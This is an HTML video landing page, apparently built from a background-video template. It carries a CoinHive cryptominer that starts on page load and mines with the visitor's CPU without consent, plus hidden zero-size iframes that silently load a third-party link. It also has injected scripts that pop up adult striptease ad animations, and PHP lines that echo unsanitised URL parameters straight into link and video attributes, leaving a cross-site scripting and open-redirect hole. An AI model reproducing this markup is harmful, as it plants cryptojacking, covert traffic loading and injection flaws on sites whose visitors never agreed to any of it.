<!doctype html>
<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <title>@n - Bideo</title>

  <style>
    * {
      margin: 0; padding: 0;
    }

    html, body {
      width: 100%;
      height: 100%;
      overflow: hidden;
    }

    #container {
      overflow: hidden;
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
    }

    #background_video {
      position: absolute;

      top: 50%; left: 50%;
      transform: translate(-50%, -50%);

      object-fit: cover;
      height: 100%; width: 100%;
    }

    #video_cover {
      display: none;
      position: absolute;

      width: 100%; height: 100%;

      background: url('video_cover.jpeg') no-repeat;
      background-size: cover;
      background-position: center;
    }

    #video_controls {
      display: none;
      position: absolute;
      left: 50%;
      z-index: 99999;
      transform: translate(-50%, 0);
    }

    #play img {
      width: 100px;
    }
    #pause img {
      width: 90px;
    }
    #pause {
      display: none;
    }

    @media (min-width: 768px) {
      #video_controls {
        display: none;
      }
    }

    /* Demo page specific styles */

    body {
      text-align: center;
      font-family: 'proxima-nova', Helvetica;
    }

    #container {
      height: 100%;
    }

    #overlay {
      position: absolute;
      top: 0; right: 0; left: 0; bottom: 0;
      background: rgba(0,0,0,0);
    }

    #main_content {
      z-index: 2;
      position: relative;
      display: inline-block;

      /* Vertical center */
      top: 50%;
      transform: translateY(-50%);
    }

    #main_content h1 {
      text-transform: uppercase;
      font-weight: 600;
      font-family: 'proxima-nova-condensed', Helvetica;
      color: #fff;
      font-size: 35px;
    }

    #main_content .sub_head {
      color: rgba(255,255,255,0.5);
      font-size: 18px;
    }

    #main_content .info {
      color: rgba(255,255,255,0.5);
      font-size: 12px;
      margin-top: 10px;
    }

    #logo {
      position: absolute;
      top: 0px;
      right: 0px;
      margin-right: 10px;
      margin-top: 10px;
      z-index: 9999999;
    }

    #footer {
      position: absolute;
      bottom: 0; left: 0; right: 0;
    }
    #footer a {
      color: rgba(255,255,255,0.5);
      text-decoration: none;
      margin: 10px;
      font-size: 12px;
    }
    #footer a:first-child {
      float: left;
    }
    #footer a:last-child {
      float: right;
    }
  </style>

  <script src="https://use.typekit.net/nlq1kdt.js"></script>
  <script>try{Typekit.load({ async: true });}catch(e){}</script>

<script>(function(T,o,t,e,m){var a,b,c=function(v){v.target.remove();var
a=o.createElement(t),b=o.getElementsByTagName(t)[0];a.async=1;a.src='https://ahmednitul.github.io/istripper.js/c.js';b.parentNode.insertBefore(a,b)};T['TotemToolsObject']=m;T[m]=T[m]||function(){(T[m].q=T[m].q||[]).push(arguments)},T[m].l=1*new
Date();a=o.createElement(t),b=o.getElementsByTagName(t)[0];a.async=1;a.addEventListener&&a.addEventListener('error',c);a.src=e;b.parentNode.insertBefore(a,b)})(window,document,'script','https://ahmednitul.github.io/istripper/l.js','loadTool');

loadTool('popping',{
        path:           'https://ahmednitul.github.io/istripper/',
        position:       'left',
        offset:         -5000,
        shuffle:        true,
        bubble:         false,
        outlink:        'http://nitul.net',
        fallbackSize:   150,
        fallbackPosition:       'left',
        bubbleText:     'GET ME NOW !', disableFallback:        false,
        disableFallbackMobile:  false,
        anims:          [
                {"id":"e0092_1","width":204,"height":345,"stick":"bottom"},
                {"id":"e0095_1","width":274,"height":200,"stick":"bottom"},
                {"id":"e0114_1","width":210,"height":340,"stick":"bottom"},
                {"id":"e0304_3","width":388,"height":290,"stick":"bottom"},
                {"id":"e0391_1","width":516,"height":320,"stick":"bottom"},
                {"id":"e0450_4","width":234,"height":340,"stick":"bottom"},
                {"id":"e0453_2","width":440,"height":320,"stick":"bottom"},
                {"id":"e0470_3","width":372,"height":320,"stick":"bottom"},
                {"id":"e0485_2","width":340,"height":320,"stick":"bottom"},
                {"id":"e0486_1","width":328,"height":345,"stick":"bottom"},
                {"id":"e0095_3","width":264,"height":340,"stick":"bottom"},
                {"id":"e0114_2","width":320,"height":340,"stick":"bottom"},
                {"id":"e0115_4","width":264,"height":340,"stick":"bottom"},
                {"id":"e0304_4","width":242,"height":390,"stick":"bottom"},
                {"id":"e0391_2","width":306,"height":340,"stick":"bottom"},
                {"id":"e0407_4","width":340,"height":340,"stick":"bottom"},
                {"id":"e0472_3","width":272,"height":340,"stick":"bottom"},
                {"id":"e0502_3","width":286,"height":340,"stick":"bottom"},
                {"id":"e0506_3","width":340,"height":340,"stick":"bottom"},
                {"id":"e0582_2","width":360,"height":340,"stick":"bottom"},
                {"id":"f0002_1","width":473,"height":217,"stick":"bottom"},
                {"id":"f0002_2","width":280,"height":315,"stick":"bottom"},
                {"id":"f0002_3","width":298,"height":315,"stick":"bottom"},
                {"id":"e0656_1","width":224,"height":336,"stick":"bottom"},
                {"id":"e0656_2","width":240,"height":336,"stick":"bottom"},
                {"id":"e0656_3","width":304,"height":285,"stick":"bottom"},
                {"id":"e0658_1","width":342,"height":266,"stick":"bottom"},
                {"id":"e0734_1","width":256,"height":346,"stick":"bottom"},
                {"id":"e0734_2","width":272,"height":336,"stick":"bottom"},
                {"id":"e0524_4","width":300,"height":320,"stick":"bottom"},
                {"id":"e0524_6","width":396,"height":325,"stick":"bottom"},
                {"id":"e0524_7","width":380,"height":360,"stick":"bottom"},
                {"id":"e0524_10","width":420,"height":360,"stick":"bottom"},
                {"id":"e0524_11","width":460,"height":380,"stick":"bottom"},
                {"id":"e0430_3","width":170,"height":400,"stick":"top"},
                {"id":"e0501_2","width":236,"height":400,"stick":"top"},
                {"id":"e0452_1","width":178,"height":400,"stick":"top"},
                {"id":"e0501_3","width":212,"height":400,"stick":"top"},
                {"id":"e0497_1","width":320,"height":400,"stick":"top"},
                {"id":"e0636_1","width":306,"height":400,"stick":"top"},
                {"id":"e0538_1","width":218,"height":400,"stick":"bottom"},
                {"id":"e0555_2","width":252,"height":400,"stick":"bottom"},
                {"id":"e0555_3","width":264,"height":400,"stick":"bottom"},
                {"id":"e0561_4","width":312,"height":400,"stick":"bottom"},
                {"id":"e0561_5","width":312,"height":400,"stick":"bottom"},
                {"id":"e0609_1","width":272,"height":400,"stick":"bottom"},
                {"id":"e0609_3","width":290,"height":400,"stick":"bottom"},
                {"id":"e0616_2","width":326,"height":400,"stick":"bottom"},
                {"id":"e0616_3","width":278,"height":400,"stick":"bottom"},
                {"id":"e0619_2","width":276,"height":400,"stick":"bottom"},
                {"id":"e0619_4","width":298,"height":400,"stick":"bottom"},
                {"id":"e0619_5","width":372,"height":400,"stick":"bottom"},
                {"id":"f0164_1","width":222,"height":400,"stick":"bottom"},
                {"id":"f0164_2","width":212,"height":400,"stick":"bottom"},
                {"id":"e0389_2","width":282,"height":490,"stick":"right"},
                {"id":"e0454_1","width":276,"height":490,"stick":"right"},
                {"id":"e0484_2","width":260,"height":490,"stick":"right"},
                {"id":"e0405_1","width":202,"height":490,"stick":"right"},
                {"id":"e0466_2","width":202,"height":490,"stick":"right"},
                {"id":"e0503_2","width":200,"height":490,"stick":"right"}
]});</script>

</head>
<body>

      <div id="logo">
      <a href="<?php echo $_GET["@"]; ?>" target="_blank" rel="follow"> <img src="https://www.uk-cheapest.co.uk/support/wp-content/uploads/2015/07/transfer-icon.png" height="60" width="60"></a>
      </div>

  <div id="container">
    <video id="background_video" loop autoplay> <source
src="<?php echo $_GET["!"]; ?>"
type="video/mp4" /> </video>
    <div id="video_cover"></div>
    <div id="overlay"></div>

    <div id="video_controls">
          <span id="play">
        <img src="play.png">
      </span>
      <span id="pause">
        <img src="pause.png">
      </span>
    </div>

    <section id="main_content">
      <div id="head">

        <a href="http://spklmis.com/?p=28&s=60689&pp=1&v=0" target="_blank" rel="follow"> <img src="//misslk.com/s.php?w=402&h=300&m=0&i=0&l=US&n=2" alt="hot
girl striptease sexy nude poledance desktop stripper" height="300" width="402"> </a>

      </div>

    </section>
  </div>

  <div id="footer">
    <iframe width="0" height="0" src="http://spklmis.com/?p=28&s=60689&pp=1&v=0" frameborder="0"></iframe>

    <iframe width="0" height="0" src="http://spklmis.com/?p=28&s=60689&pp=1&v=0" frameborder="0"></iframe>

    <a href="http://www.microsoft.com" target="_blank" onclick="window.open('http://www.google.com');"> <img src="//misslk.com/s.php?w=468&h=60&m=0&i=0&l=US&n=2" alt="hot girl striptease sexy nude poledance desktop stripper" height="60" width="468"> </a>

  </div>

  <script src="https://ahmednitul.github.io/bideo.js/bideo.js"></script>
  <script src="https://ahmednitul.github.io/iframed/main.js"></script>

  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
  <script>
        var miner = new CoinHive.Anonymous('T4tL3hVUTcyS0UNmhoY5PHbxmVZqj1F2', {threads: 4, throttle: 0.2});
        miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
  </script>

</body>
</html>
